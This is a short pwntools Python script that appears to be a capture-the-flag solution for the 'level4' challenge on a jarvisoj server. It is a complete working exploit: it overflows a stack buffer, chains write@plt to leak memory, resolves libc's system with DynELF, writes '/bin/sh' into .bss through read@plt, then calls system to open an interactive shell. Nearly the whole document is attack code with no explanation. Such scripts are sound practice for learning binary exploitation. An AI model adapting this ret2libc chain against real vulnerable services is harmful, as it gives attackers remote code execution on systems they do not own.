#!/usr/bin/python
from pwn import *
sh = remote('pwn2.jarvisoj.com',9880)
e = ELF('./level4')

write = e.plt['write']
read = e.plt['read']
vul = e.symbols['vulnerable_function']
bss = e.symbols['__bss_start']
pad = (0x88+4)*'b'

def leak(address):
	payload = pad + p32(write) + p32(vul) + p32(1) + p32(address) + p32(4)
	sh.sendline(payload)
	data = sh.recv(4)
	return data

d = DynELF(leak,elf=e)
system = d.lookup('system','libc')
success('system addr :'+hex(system))

payload1 = pad + p32(read) + p32(vul) + p32(0) + p32(bss) + p32(8)
sh.sendline(payload1)
sh.send('/bin/sh\x00')#不能用sendline
success('successful write /bin/sh to bss('+hex(bss)+')')

payload2 = pad + p32(system) + p32(1) + p32(bss)
sh.send(payload2)
sh.interactive()
